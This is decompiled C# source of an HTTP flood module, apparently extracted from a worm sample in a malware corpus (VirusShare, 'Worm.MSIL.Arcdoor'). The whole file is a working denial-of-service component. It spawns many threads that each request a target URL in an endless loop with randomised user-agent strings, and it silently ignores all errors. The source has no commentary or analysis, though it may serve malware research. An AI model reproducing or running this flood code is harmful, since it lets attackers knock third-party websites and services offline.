// Decompiled with JetBrains decompiler
// Type: SysDriver.nHTTPFlood
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A26C35F-BA28-4E81-84A7-2E70BFB0BF2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Arcdoor.rd-c1c8aa0e1c017af03529dea9d73a38478f6fd04477b4a68c5889f87bb96df945.exe

using System;
using System.Net;
using System.Text;
using System.Threading;

namespace SysDriver
{
  internal class nHTTPFlood
  {
    private static ThreadStart[] tFloodingJob;
    private static Thread[] tFloodingThread;
    public static string sFHost;
    private static nHTTPFlood.HTTPRequest[] hRequestClass;
    public static int iThreads;

    public static void StartHTTPFlood()
    {
      nHTTPFlood.tFloodingThread = new Thread[nHTTPFlood.iThreads];
      nHTTPFlood.tFloodingJob = new ThreadStart[nHTTPFlood.iThreads];
      nHTTPFlood.hRequestClass = new nHTTPFlood.HTTPRequest[nHTTPFlood.iThreads];
      if (!nHTTPFlood.sFHost.StartsWith("http://"))
        nHTTPFlood.sFHost = "http://" + nHTTPFlood.sFHost;
      for (int index = 0; index < nHTTPFlood.iThreads; ++index)
      {
        nHTTPFlood.hRequestClass[index] = new nHTTPFlood.HTTPRequest(nHTTPFlood.sFHost);
        nHTTPFlood.tFloodingJob[index] = new ThreadStart(nHTTPFlood.hRequestClass[index].Send);
        nHTTPFlood.tFloodingThread[index] = new Thread(nHTTPFlood.tFloodingJob[index]);
        nHTTPFlood.tFloodingThread[index].Start();
      }
    }

    public static void StopHTTPFlood()
    {
      for (int index = 0; index < nHTTPFlood.iThreads; ++index)
      {
        try
        {
          nHTTPFlood.tFloodingThread[index].Abort();
          nHTTPFlood.tFloodingThread[index].Join();
        }
        catch
        {
        }
      }
    }

    private class HTTPRequest
    {
      private string sFHost;
      private WebClient wHTTP = new WebClient();

      public HTTPRequest(string tHost) => this.sFHost = tHost;

      public void Send()
      {
        while (true)
        {
          try
          {
            this.wHTTP.Headers.Add("user-agent", this.GetRandomUserAgent());
            this.wHTTP.DownloadString(this.sFHost);
          }
          catch
          {
          }
        }
      }

      private string GetRandomUserAgent() => this.GetRandomString(54, 135, false);

      private string GetRandomString(int sizeMin, int sizeMax, bool lowerCase)
      {
        StringBuilder stringBuilder = new StringBuilder();
        Random random = new Random();
        int num = random.Next(sizeMin, sizeMax);
        for (int index = 0; index < num; ++index)
        {
          char ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
          stringBuilder.Append(ch);
        }
        return lowerCase ? stringBuilder.ToString().ToLower() : stringBuilder.ToString();
      }
    }
  }
}
